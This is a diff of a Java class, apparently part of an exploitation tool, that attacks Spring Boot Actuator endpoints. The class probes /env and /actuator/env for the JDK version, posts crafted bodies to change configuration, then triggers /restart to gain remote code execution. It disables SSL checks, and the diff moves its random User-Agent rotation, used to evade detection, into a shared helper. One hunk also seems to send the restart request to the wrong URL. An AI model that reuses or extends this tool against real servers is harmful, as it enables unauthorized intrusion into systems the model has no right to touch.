@@ -1,6 +1,6 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 import src.main.common.VersionComparator;
 import src.main.impl.ResultCallback;
 
@@ -9,15 +9,13 @@ import java.io.FileWriter;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
-import java.util.List;
 import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class LoggingConfigRCE {
     private String address;
@@ -45,16 +43,10 @@ public class LoggingConfigRCE {
         String resapi = "/restart";
         String site = address + api;
         String resite = address + resapi;
-        String ua = "";
         String data = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -73,10 +65,7 @@ public class LoggingConfigRCE {
                     text = "当前jdk版本为: " + matcher.group(1);
                     callback.onResult(text);
                     try {
-                        URL obj1 = new URL(site);
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn1.setRequestProperty("User-Agent", ua);
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                         conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                         conn1.setRequestMethod("POST");
                         conn1.setDoOutput(true);
@@ -97,10 +86,7 @@ public class LoggingConfigRCE {
                         int responseCode1 = conn1.getResponseCode();
                         if (responseCode1 == HttpURLConnection.HTTP_OK) {
                             try {
-                                URL obj2 = new URL(resite);
-                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                                ua = uacf.getRandomUserAgent(ualist);
-                                conn2.setRequestProperty("User-Agent", ua);
+                                HttpURLConnection conn2 = HTTPConfig.createConnection(site);
                                 conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                                 conn2.setRequestMethod("POST");
                                 conn2.setDoOutput(true);
@@ -145,16 +131,10 @@ public class LoggingConfigRCE {
         String resapi = "/actuator/restart";
         String site = address + api;
         String resite = address + resapi;
-        String ua = "";
         String data = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -173,10 +153,7 @@ public class LoggingConfigRCE {
                     text = "当前jdk版本为: " + matcher.group(1);
                     callback.onResult(text);
                     try {
-                        URL obj1 = new URL(site);
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn1.setRequestProperty("User-Agent", ua);
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                         conn1.setRequestProperty("Content-Type", "application/json");
                         conn1.setRequestMethod("POST");
                         conn1.setDoOutput(true);
@@ -197,10 +174,7 @@ public class LoggingConfigRCE {
                         int responseCode1 = conn1.getResponseCode();
                         if (responseCode1 == HttpURLConnection.HTTP_OK) {
                             try {
-                                URL obj2 = new URL(resite);
-                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                                ua = uacf.getRandomUserAgent(ualist);
-                                conn2.setRequestProperty("User-Agent", ua);
+                                HttpURLConnection conn2 = HTTPConfig.createConnection(resite);
                                 conn2.setRequestProperty("Content-Type", "application/json");
                                 conn2.setRequestMethod("POST");
                                 conn2.setDoOutput(true);
@@ -243,15 +217,9 @@ public class LoggingConfigRCE {
         String llib = "jdk";
         String api = "/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -281,15 +249,9 @@ public class LoggingConfigRCE {
         String llib = "jdk";
         String api = "/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -313,10 +275,8 @@ public class LoggingConfigRCE {
                             VersionComparator.isVersionAtLeast(matcher.group(1),"7u191") ||
                             VersionComparator.isVersionAtLeast(matcher.group(1),"6u201")
                     ){
-                        URL obj1 = new URL(address + "/actuator");
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                         conn1.setDoOutput(true);
-                        conn1.setRequestProperty("User-Agent", ua);
                         conn1.setRequestMethod("GET");
                         int responseCode1 = conn1.getResponseCode();
                         BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -348,15 +308,9 @@ public class LoggingConfigRCE {
     public void Exp(ResultCallback callback){
         String api = "/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
